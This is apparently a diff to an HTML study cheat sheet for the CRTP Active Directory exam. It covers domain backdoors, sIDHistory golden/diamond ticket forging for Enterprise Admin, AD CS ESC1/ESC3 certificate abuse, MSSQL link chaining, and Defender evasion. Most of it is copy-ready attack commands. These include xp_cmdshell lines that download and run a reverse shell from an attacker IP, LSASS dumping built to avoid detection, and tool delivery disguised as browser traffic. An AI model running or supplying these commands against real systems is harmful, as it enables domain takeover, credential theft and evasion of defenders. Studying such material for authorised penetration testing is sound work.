+      <div class="cmd"><span class="comment"># WMI backdoor (RACE toolkit):</span>
+<span class="tool">Set-RemoteWMI</span> <span class="flag">-SamAccountName</span> student1 <span class="flag">-ComputerName</span> dcorp-dc <span class="flag">-namespace</span> <span class="string">'root\cimv2'</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Remote Registry backdoor:</span>
+<span class="tool">Add-RemoteRegBackdoor</span> <span class="flag">-ComputerName</span> dcorp-dc <span class="flag">-Trustee</span> student1 <span class="flag">-Verbose</span>
+<span class="comment"># Retrieve machine account hash:</span>
+<span class="tool">Get-RemoteMachineAccountHash</span> <span class="flag">-ComputerName</span> dcorp-dc <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Custom SSP (logs ALL creds to mimilsa.log):</span>
+<span class="tool">SafetyKatz.exe</span> <span class="flag">-Command</span> <span class="string">'\"misc::memssp\"'</span><span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- TAB 6: CROSS TRUST -->
+<div class="tab-panel" id="tab-6">
+  <div class="section-title"><span>🌐</span> Cross Trust Attacks</div>
+  <div class="section-subtitle">Child→Parent · Forest Trusts · sIDHistory Abuse · Enterprise Admin Escalation</div>
+  <div class="section-desc">
+    After owning a child domain, the next goal is <strong>Enterprise Admin</strong> — full control of the entire forest. The two-way transitive parent-child trust is your attack path. The core technique is <strong>sIDHistory injection</strong>: Kerberos tickets carry a list of SIDs representing group memberships. The <em>sIDHistory</em> field allows extra SIDs from a migration context. By injecting the Enterprise Admins group SID (<code>-519</code>) or the Enterprise Domain Controllers SID (<code>S-1-5-9</code>) into a forged ticket, the parent DC sees these and grants EA-level access. There are three methods — each with different tradeoffs in stealth and complexity.
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">Attack Path Overview</div>
+    <div style="margin:10px 0">
+      <div style="color:var(--text3);font-size:12px;margin-bottom:6px">Child → Parent (Enterprise Admin escalation):</div>
+      <div class="chain">
+        <div class="chain-item">DA on child domain</div><div class="chain-arrow">→</div>
+        <div class="chain-item">Get krbtgt OR trust key</div><div class="chain-arrow">→</div>
+        <div class="chain-item hi">Inject EA SID via sIDHistory</div><div class="chain-arrow">→</div>
+        <div class="chain-item">Enterprise Admin on parent</div><div class="chain-arrow">→</div>
+        <div class="chain-item">DCSync parent → own forest</div>
+      </div>
+    </div>
+    <div>
+      <div style="color:var(--text3);font-size:12px;margin-bottom:6px">Cross Forest (external forest trust):</div>
+      <div class="chain">
+        <div class="chain-item">DA on domain</div><div class="chain-arrow">→</div>
+        <div class="chain-item">Get forest trust key</div><div class="chain-arrow">→</div>
+        <div class="chain-item hi">Forge inter-forest inter-realm TGT</div><div class="chain-arrow">→</div>
+        <div class="chain-item">Access resources in target forest</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">Method 1 — Trust Key (Inter-Realm TGT) <span class="tag tag-orange">Most Precise</span></div>
+      <div class="card-desc">Every domain trust has a <strong>shared secret (trust key)</strong> used to encrypt inter-realm tickets. If you have DA on the child domain, you can extract this key and forge an <em>inter-realm TGT</em> — a ticket that tells the parent domain "this user came from the child domain and has these group memberships." By injecting the EA SID, the parent treats the ticket holder as Enterprise Admin. This is the most technically accurate method, matching exactly what legitimate cross-domain authentication looks like.</div>
+      <div class="cmd"><span class="comment"># Get child→parent trust key (needs DA on child DC):</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::trust /patch"</span>
+<span class="comment"># Cleaner — via DCSync (no code exec on DC):</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:dcorp\mcorp$"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Forge inter-realm TGT using trust key (Rubeus silver targets krbtgt service):</span>
+<span class="tool">Rubeus.exe</span> silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:&lt;trust_key_ntlm&gt; /sid:&lt;child_SID&gt; /sids:S-1-5-21-&lt;parent&gt;-519 /ldap /user:Administrator /nowrap<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Use forged inter-realm TGT to request actual TGS from parent:</span>
+<span class="tool">Rubeus.exe</span> asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:&lt;FORGED_TICKET&gt;<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Method 2 — krbtgt Hash + sIDHistory <span class="tag tag-red">Simplest</span></div>
+      <div class="card-desc">The simplest approach. If you have the child domain's <strong>krbtgt hash</strong>, forge a Golden ticket and add the parent's <strong>Enterprise Admins SID</strong> into the sIDHistory field. The parent DC trusts the ticket because it trusts the child domain's krbtgt. <strong>MDI bypass</strong>: forge as dcorp-dc$ (DC identity) and inject Enterprise Domain Controllers SIDs — looks like legitimate DC-to-DC replication.</div>
+      <div class="cmd"><span class="comment"># Standard — Mimikatz golden with sIDHistory EA SID:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:&lt;child_SID&gt; /sids:S-1-5-21-&lt;parent&gt;-519 /krbtgt:&lt;hash&gt; /ptt"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># MDI bypass — use DC$ identity + Enterprise DC SIDs:</span>
+<span class="tool">Rubeus.exe</span> golden /aes256:&lt;krbtgt_aes&gt; /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:&lt;child_SID&gt; /sids:S-1-5-21-&lt;parent&gt;-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Then DCSync the parent domain:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">Method 3 — Diamond Ticket with SID History <span class="tag tag-green">Safest / Best Opsec</span></div>
+    <div class="card-desc">Diamond ticket modifies a <strong>real DC-issued TGT</strong> rather than forging one from scratch. This means valid ticket timestamps, a real TGT request in DC logs, and no forged PAC anomalies. Combined with the DC identity and Enterprise DC SIDs in sIDHistory, this is the hardest method to detect with MDI. The <code>/tgtdeleg</code> flag uses your current domain user's TGT to get the real ticket base — no password needed.</div>
+    <div class="cmd"><span class="tool">Rubeus.exe</span> diamond /krbkey:&lt;krbtgt_aes&gt; /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-&lt;parent&gt;-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt<span class="copy-hint">click to copy</span></div>
+    <div class="cmd"><span class="comment"># Then DCSync the parent domain:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="string">"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"</span> <span class="string">"exit"</span><span class="copy-hint">click to copy</span></div>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">Cross Forest Trust Attack <span class="tag tag-orange">Forest Trust Key</span></div>
+      <div class="card-desc">Forest trusts have their own <strong>inter-forest trust key</strong> — a shared secret between the two forest root DCs. Extract it from the DC (trust /patch or DCSync), then forge an inter-realm TGT targeting the other forest's krbtgt. From there, request actual TGS tickets for services in the target forest. Note: SID filtering (SID quarantine) is usually enabled on forest trusts, so the EA SID injection trick used for child→parent does NOT work across forest boundaries — you can only access resources that explicitly grant access to your domain.</div>
+      <div class="cmd"><span class="comment"># Get forest trust key from DC:</span>
+<span class="tool">SafetyKatz.exe</span> <span class="flag">-Command</span> <span class="string">'\"lsadump::trust /patch\"'</span>
+<span class="tool">SafetyKatz.exe</span> <span class="flag">-Command</span> <span class="string">'\"lsadump::lsa /patch\"'</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Forge inter-forest inter-realm TGT:</span>
+<span class="tool">Rubeus.exe</span> silver /service:krbtgt/EUROCORP.LOCAL /rc4:&lt;trust_key&gt; /sid:&lt;current_SID&gt; /sids:S-1-5-21-&lt;eurocorp&gt;-519 /ldap /user:Administrator /nowrap<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Get TGS for target forest service (CIFS, HTTP, etc.):</span>
+<span class="tool">Rubeus.exe</span> asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt /ticket:&lt;FORGED&gt;<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Key SIDs for Trust Attacks</div>
+      <div class="card-desc">Know these SIDs by memory — you'll be plugging them into ticket-forging commands constantly. The most important ones for escalation: <code>-519</code> (Enterprise Admins, only valid in parent domain) and <code>S-1-5-9</code> (Enterprise Domain Controllers, forest-wide). MDI bypass requires BOTH <code>-516</code> and <code>S-1-5-9</code>.</div>
+      <table class="ref-table">
+        <tr><th>SID Pattern</th><th>Group / Meaning</th><th>Use in</th></tr>
+        <tr><td class="sid">S-1-5-21-&lt;parent&gt;-519</td><td>Enterprise Admins</td><td>sIDHistory for EA access</td></tr>
+        <tr><td class="sid">S-1-5-21-&lt;domain&gt;-516</td><td>Domain Controllers</td><td>MDI bypass (with S-1-5-9)</td></tr>
+        <tr><td class="sid">S-1-5-21-&lt;domain&gt;-512</td><td>Domain Admins</td><td>Group membership in tickets</td></tr>
+        <tr><td class="sid">S-1-5-9</td><td>Enterprise Domain Controllers</td><td>MDI bypass (forest-wide)</td></tr>
+        <tr><td class="sid">S-1-5-21-&lt;domain&gt;-500</td><td>Administrator account</td><td>/id: flag in golden ticket</td></tr>
+        <tr><td class="sid">S-1-5-21-&lt;domain&gt;-513</td><td>Domain Users</td><td>Base group membership</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- TAB 7: AD CS -->
+<div class="tab-panel" id="tab-7">
+  <div class="section-title"><span>📜</span> Active Directory Certificate Services (AD CS)</div>
+  <div class="section-subtitle">ESC1–ESC15 · Certify · Certificate Auth · DA/EA via Certificate</div>
+  <div class="section-desc">
+    <strong>AD CS (Active Directory Certificate Services)</strong> is Microsoft's PKI implementation. It issues certificates used for authentication, encryption, and code signing. The research paper "<em>Certified Pre-Owned</em>" (SpecterOps, 2021) identified 15+ misconfigurations (ESC1–ESC15) that allow privilege escalation. The core attack pattern: get a certificate for a privileged user → use that cert to request a TGT as that user → own the domain. Certificates are valid for 1 year by default — making these backdoors extremely persistent.
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">AD CS Core Concepts</div>
+    <div class="grid-2" style="margin-top:8px">
+      <div>
+        <table class="ref-table">
+          <tr><th>Term</th><th>Meaning</th></tr>
+          <tr><td>CA</td><td>Certification Authority — the server that signs certs</td></tr>
+          <tr><td>CSR</td><td>Certificate Signing Request — sent to CA to get a cert</td></tr>
+          <tr><td>Template</td><td>Blueprint that defines who can enroll, what the cert allows, how long it's valid</td></tr>
+          <tr><td>EKU</td><td>Extended Key Usage — OID that specifies what the cert can be used for (Client Auth, Smart Card Logon, Code Signing, etc.)</td></tr>
+          <tr><td>SAN</td><td>Subject Alternative Name — additional identity in cert (used for ESC1)</td></tr>
+          <tr><td>Enrollment Agent</td><td>Account allowed to request certs on behalf of other users (used for ESC3)</td></tr>
+        </table>
+      </div>
+      <div>
+        <div class="card-desc"><strong>How cert-based auth works:</strong> Request cert → prove identity → CA signs cert → present cert to DC → DC issues TGT for the identity in the cert. Since the cert holds the user's identity, a cert for "Administrator" gets you an Administrator TGT.</div>
+        <div class="cmd"><span class="comment"># Enumerate all CAs in the domain:</span>
+<span class="tool">Certify.exe</span> cas<span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># List all certificate templates:</span>
+<span class="tool">Certify.exe</span> find<span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># Find vulnerable templates (ESC1-ESC8):</span>
+<span class="tool">Certify.exe</span> find /vulnerable<span class="copy-hint">click to copy</span></div>
+        <div class="cmd"><span class="comment"># Find ESC1 specifically (enrollee supplies subject):</span>
+<span class="tool">Certify.exe</span> find /enrolleeSuppliesSubject<span class="copy-hint">click to copy</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">ESC1 — Enrollee Supplies Subject <span class="tag tag-red">Critical — Any User</span></div>
+      <div class="card-desc">A certificate template has the <strong>ENROLLEE_SUPPLIES_SUBJECT</strong> flag set, AND allows Domain Users (or similar low-priv group) to enroll. This means any domain user can request a certificate and <strong>specify any username in the SAN field</strong> — including Administrator. The CA happily signs it. The resulting certificate authenticates you as Administrator to any service that accepts certificate-based auth, including Kerberos (PKINIT).</div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-content">
+          <div class="step-label">Request cert claiming to be Administrator</div>
+          <div class="step-desc">The /altname specifies the SAN — who the cert claims to be.</div>
+          <div class="cmd"><span class="tool">Certify.exe</span> request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:<span class="string">"HTTPSCertificates"</span> /altname:administrator<span class="copy-hint">click to copy</span></div>
+        </div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-content">
+          <div class="step-label">Convert PEM output to PFX format (needed by Rubeus)</div>
+          <div class="cmd">openssl pkcs12 -export -in cert.pem -out esc1.pfx -password pass:SecretPass@123<span class="copy-hint">click to copy</span></div>
+        </div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-content">
+          <div class="step-label">Request TGT as Administrator using the certificate</div>
+          <div class="cmd"><span class="tool">Rubeus.exe</span> asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt<span class="copy-hint">click to copy</span></div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">ESC3 — Enrollment Agent Abuse <span class="tag tag-red">Critical — Proxy Enrollment</span></div>
+      <div class="card-desc">Two vulnerable templates combine for this attack: Template 1 has an Application Policy OID for <em>Certificate Request Agent</em> and can be enrolled by low-priv users → get an <strong>Enrollment Agent certificate</strong>. Template 2 has an Application Policy that requires an Enrollment Agent to sign requests. Use the Agent cert to <strong>request a certificate on behalf of any user</strong> — including DA/EA. This works even if the target user would never be able to enroll themselves.</div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-content">
+          <div class="step-label">Get enrollment agent certificate (Template 1)</div>
+          <div class="cmd"><span class="tool">Certify.exe</span> request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent<span class="copy-hint">click to copy</span></div>
+        </div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-content">
+          <div class="step-label">Use agent cert to request cert on behalf of DA (Template 2)</div>
+          <div class="cmd"><span class="tool">Certify.exe</span> request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123<span class="copy-hint">click to copy</span></div>
+        </div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-content">
+          <div class="step-label">Use DA cert to get TGT as Domain Admin</div>
+          <div class="cmd"><span class="tool">Rubeus.exe</span> asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt<span class="copy-hint">click to copy</span></div>
+        </div></div>
+        <div class="step"><div class="step-num">EA</div><div class="step-content">
+          <div class="step-label">Same flow targeting moneycorp\administrator for Enterprise Admin</div>
+          <div class="cmd"><span class="tool">Rubeus.exe</span> asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt<span class="copy-hint">click to copy</span></div>
+        </div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">All ESC Vulnerabilities — Complete Reference</div>
+    <div class="card-desc">ESC = "EScalation via Certificate". The number indicates discovery order from the Certified Pre-Owned paper. ESC1-ESC8 are the original 8 from 2021; ESC9-ESC15 were added in follow-up research. For the CRTP exam, focus on <strong>ESC1 and ESC3</strong> — they are the most commonly found in enterprise environments and are in the lab.</div>
+    <table class="ref-table" style="margin-top:8px">
+      <tr><th>ESC</th><th>Vulnerability</th><th>Root Cause</th><th>Status</th></tr>
+      <tr><td>ESC1</td><td>Enrollee supplies SAN → cert for any user</td><td>ENROLLEE_SUPPLIES_SUBJECT + low-priv enrollment</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC2</td><td>Any purpose / no EKU template</td><td>Overly permissive EKU (Any Purpose OID)</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC3</td><td>Enrollment agent → cert on behalf of any user</td><td>Certificate Request Agent OID + permissive template</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC4</td><td>Permissive ACLs on template → modify it to ESC1</td><td>WriteDACL/GenericWrite on template object</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC5</td><td>Poor access control on CA server/PKS object</td><td>WriteDACL on CA server computer object</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC6</td><td>CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled</td><td>Any cert request can specify SAN regardless of template</td><td><span class="tag tag-green">Patched May'22</span></td></tr>
+      <tr><td>ESC7</td><td>Poor access on CA roles</td><td>Unprivileged user has CA Admin or Certificate Manager role</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC8</td><td>NTLM relay to HTTP enrollment endpoint</td><td>Web enrollment enabled, no HTTPS/EPA protection</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC9</td><td>No Security Extension on cert + modify UPN</td><td>GenericWrite on target + ct_flag_no_security_extension</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC10</td><td>Weak certificate mapping → spoof cert identity</td><td>Legacy strong mapping disabled on DC</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC11</td><td>NTLM relay to RPC enrollment endpoint (ICertPassage)</td><td>RPC enrollment without EPA/signing</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC12</td><td>Steal CA private key via YubiHSM</td><td>Physical HSM access + weak YubiHSM auth</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC13</td><td>Enrollee inherits privileges of issuance policy group</td><td>OID group link in template</td><td><span class="tag tag-red">Active</span></td></tr>
+      <tr><td>ESC14</td><td>altSecurityIdentities attribute abuse</td><td>GenericWrite → set altSecurityIdentities → cert maps to user</td><td><span class="tag tag-orange">To be patched</span></td></tr>
+      <tr><td>ESC15</td><td>EKUwu — v1 template EKU override</td><td>Client specifies EKU in CSR for v1 schema templates</td><td><span class="tag tag-green">Patched Nov'24</span></td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- TAB 8: MSSQL -->
+<div class="tab-panel" id="tab-8">
+  <div class="section-title"><span>🗄️</span> MSSQL Server Abuse</div>
+  <div class="section-subtitle">PowerUpSQL · Database Links · xp_cmdshell · Cross-Forest Code Execution</div>
+  <div class="section-desc">
+    SQL Server is a common component in enterprise environments and is often configured with overly permissive access. The key attack surface is <strong>Database Links</strong> — a SQL Server feature that allows one SQL instance to query another. These links can chain across multiple servers and <strong>even across forest trust boundaries</strong>. If xp_cmdshell is enabled (or can be enabled) on a linked server, you get OS-level command execution as the SQL service account — which is frequently a domain account with elevated privileges.
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">Discovery with PowerUpSQL <span class="tag tag-blue">Recon</span></div>
+      <div class="card-desc"><strong>PowerUpSQL</strong> automates SQL Server discovery, access testing, and exploitation. SQL instances are discovered by scanning for SPNs (<code>MSSQLSvc</code>) in Active Directory — this reveals every SQL server in the domain without needing to scan ports. From there, test which ones you can connect to with your current Windows identity (integrated auth).</div>
+      <div class="cmd"><span class="comment"># Discover SQL servers in domain via SPN scan:</span>
+<span class="tool">Get-SQLInstanceDomain</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Test which ones accept your current credentials:</span>
+<span class="tool">Get-SQLInstanceDomain</span> | <span class="tool">Get-SQLConnectionTestThreaded</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Get version, service account info, linked servers:</span>
+<span class="tool">Get-SQLInstanceDomain</span> | <span class="tool">Get-SQLServerInfo</span> <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Database Links — The Attack Path <span class="tag tag-orange">Key Concept</span></div>
+      <div class="card-desc"><strong>Database links</strong> are configured connections between SQL Server instances that allow one to query another using a stored set of credentials (often SA/sysadmin level). The linked server runs your queries using those elevated credentials — so even if you're a low-priv user on dcorp-mssql, commands that travel through links to eu-sql run as sa. <strong>Links work even across forest trusts</strong> because they use SQL Server's own authentication, not Windows/Kerberos.</div>
+      <div class="cmd"><span class="comment"># Enumerate direct links from dcorp-mssql:</span>
+<span class="tool">Get-SQLServerLink</span> <span class="flag">-Instance</span> dcorp-mssql <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># T-SQL equivalent:</span>
+select * from master..sysservers<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Auto-crawl ALL links recursively:</span>
+<span class="tool">Get-SQLServerLinkCrawl</span> <span class="flag">-Instance</span> dcorp-mssql <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">Manual Link Traversal (T-SQL)</div>
+      <div class="card-desc">Use <strong>OPENQUERY</strong> to send SQL queries through a link. Each additional server in the chain requires one more level of nesting — and the quote escaping grows exponentially. For 3+ hops, PowerUpSQL's crawler is far easier.</div>
+      <div class="cmd"><span class="comment"># 1 hop — query dcorp-sql1 from dcorp-mssql:</span>
+select * from openquery(<span class="string">"dcorp-sql1"</span>,<span class="string">'select * from master..sysservers'</span>)<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># 2 hops — query dcorp-mgmt through dcorp-sql1:</span>
+select * from openquery(<span class="string">"dcorp-sql1"</span>,<span class="string">'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')'</span>)<span class="copy-hint">click to copy</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Enable xp_cmdshell & Execute Commands</div>
+      <div class="card-desc"><strong>xp_cmdshell</strong> is an extended stored procedure that runs OS commands as the SQL Server service account. It's disabled by default but can be enabled with sysadmin rights. The <code>EXECUTE ... AT</code> syntax runs SQL on a specific linked server, allowing you to enable xp_cmdshell on a remote server and execute commands through the chain.</div>
+      <div class="cmd"><span class="comment"># Enable xp_cmdshell on linked server eu-sql (needs rpcout=true on link):</span>
+EXECUTE(<span class="string">'sp_configure ''xp_cmdshell'',1;reconfigure;'</span>) AT <span class="string">"eu-sql"</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Execute command on specific target via PowerUpSQL:</span>
+<span class="tool">Get-SQLServerLinkCrawl</span> <span class="flag">-Instance</span> dcorp-mssql <span class="flag">-Query</span> <span class="string">"exec master..xp_cmdshell 'whoami'"</span> <span class="flag">-QueryTarget</span> eu-sql<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Reverse shell via link (start listener first):</span>
+<span class="tool">Get-SQLServerLinkCrawl</span> <span class="flag">-Instance</span> dcorp-mssql <span class="flag">-Query</span> <span class="string">"exec master..xp_cmdshell 'powershell -c iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')'"</span> <span class="flag">-QueryTarget</span> eu-sql<span class="copy-hint">click to copy</span></div>
+    </div>
+  </div>
+
+  <div class="card mb">
+    <div class="card-title">Full Chain Attack — dcorp-mssql → eu-sql (Cross Forest)</div>
+    <div class="card-desc">The lab's goal is to achieve command execution on <strong>eu-sql in the eurocorp forest</strong> by chaining through dcorp-mssql → dcorp-sql1 → dcorp-mgmt → eu-sql. Each hop uses the stored link credentials. This works cross-forest because SQL links use SQL auth, not Kerberos, bypassing normal forest trust restrictions.</div>
+    <div class="steps">
+      <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-label">Map the full link chain</div><div class="step-desc">Crawl from dcorp-mssql to discover all reachable linked servers.</div><div class="cmd"><span class="tool">Get-SQLServerLinkCrawl</span> <span class="flag">-Instance</span> dcorp-mssql <span class="flag">-Verbose</span><span class="copy-hint">click to copy</span></div></div></div>
+      <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-label">Verify each hop's SQL role (check if sysadmin)</div><div class="cmd"><span class="tool">Get-SQLServerLinkCrawl</span> <span class="flag">-Instance</span> dcorp-mssql <span class="flag">-Query</span> <span class="string">"select system_user"</span><span class="copy-hint">click to copy</span></div></div></div>
+      <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-label">Enable xp_cmdshell on the target linked server</div><div class="cmd">EXECUTE(<span class="string">'sp_configure ''xp_cmdshell'',1;reconfigure;'</span>) AT <span class="string">"eu-sql.eu.eurocorp.local"</span><span class="copy-hint">click to copy</span></div></div></div>
+      <div class="step"><div class="step-num">4</div><div class="step-content"><div class="step-label">Execute reverse shell / download-execute via xp_cmdshell</div><div class="cmd"><span class="tool">Get-SQLServerLinkCrawl</span> <span class="flag">-Instance</span> dcorp-mssql <span class="flag">-Query</span> <span class="string">"exec master..xp_cmdshell 'powershell -c iex (iwr http://172.16.100.X/shell.ps1)'"</span> <span class="flag">-QueryTarget</span> eu-sql<span class="copy-hint">click to copy</span></div></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- TAB 9: MDE/MDI BYPASS -->
+<div class="tab-panel" id="tab-9">
+  <div class="section-title"><span>🕵️</span> MDE & MDI Bypass</div>
+  <div class="section-subtitle">Microsoft Defender for Endpoint · Microsoft Defender for Identity — stay undetected</div>
+  <div class="section-desc">
+    Modern enterprise environments deploy two key Microsoft security products: <strong>MDE (Microsoft Defender for Endpoint)</strong> monitors endpoint activity — process creation, file writes, network connections, LSASS access. <strong>MDI (Microsoft Defender for Identity)</strong> monitors Active Directory specifically — LDAP queries, Kerberos traffic, replication requests, lateral movement patterns. They have different blind spots. This tab covers techniques to operate in environments with both deployed.
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">LSASS Dump — Bypass MDE <span class="tag tag-red">High Detection</span></div>
+      <div class="card-desc">MDE hooks the <strong>MiniDumpWriteDump</strong> Windows API — any tool that calls this function to dump LSASS is immediately detected and blocked. This includes Task Manager, ProcDump, standard Mimikatz, and comsvcs.dll. The bypass: use <strong>MiniDumpDotNet</strong> which is a <em>completely reimplemented</em> version of MiniDumpWriteDump based on ReactOS source code and adapted from a BOF. It doesn't call the hooked API at all — it reimplements the same functionality at a lower level. Finding the LSASS PID also requires care — <code>tasklist /v</code> itself triggers MDE alerts when run under suspicious processes.</div>
+      <div class="cmd"><span class="comment"># Step 1 — Find LSASS PID safely (no tasklist):</span>
+<span class="tool">FindLSASSPID.exe</span>          <span class="comment"># Uses CreateToolhelp32Snapshot internally</span><span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Step 2 — Dump LSASS using custom reimplementation:</span>
+<span class="tool">minidumpdotnet.exe</span> &lt;LSASS_PID&gt; lsass.dmp<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Step 3 — Parse dump offline with pypykatz:</span>
+pypykatz lsa minidump lsass.dmp<span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-green"><span class="alert-icon">✅</span><div>MiniDumpDotNet is not flagged by MDE or Defender AV because it doesn't use the monitored API. The dump file itself is also not flagged — parse it offline on your attacker machine.</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Opsec-Safe Tool Transfer <span class="tag tag-green">Stealth</span></div>
+      <div class="card-desc">Standard PowerShell download methods (<code>Invoke-WebRequest</code>, <code>WebClient.DownloadFile</code>) are logged and raise risk scores in MDE. Two better options: <strong>msedge.exe headless</strong> downloads files just like a normal browser — traffic is expected, no alert. <strong>SMB shares</strong> let you run binaries directly from a network path without writing to disk at all — MDE still sees the process creation but misses the file write event that often triggers alerting.</div>
+      <div class="cmd"><span class="comment"># Download via msedge.exe (looks like normal browser traffic):</span>
+<span class="string">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</span> --headless --disable-gpu --dump-dom <span class="string">http://172.16.100.X/tool.exe</span> &gt; tool.exe<span class="copy-hint">click to copy</span></div>
+      <div class="cmd"><span class="comment"># Execute directly from attacker SMB share (no disk write):</span>
+\\172.16.100.X\share\SafetyKatz.exe <span class="string">"sekurlsa::ekeys"</span><span class="copy-hint">click to copy</span></div>
+      <div class="alert alert-orange"><span class="alert-icon">⚠️</span><div>Always use <code>--break-system-packages</code> when setting up tools. Keep your web server running the whole engagement. SMB execution requires your listener stays up.</div></div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb">
+    <div class="card">
+      <div class="card-title">ASR Rules Bypass <span class="tag tag-orange">Attack Surface Reduction</span></div>
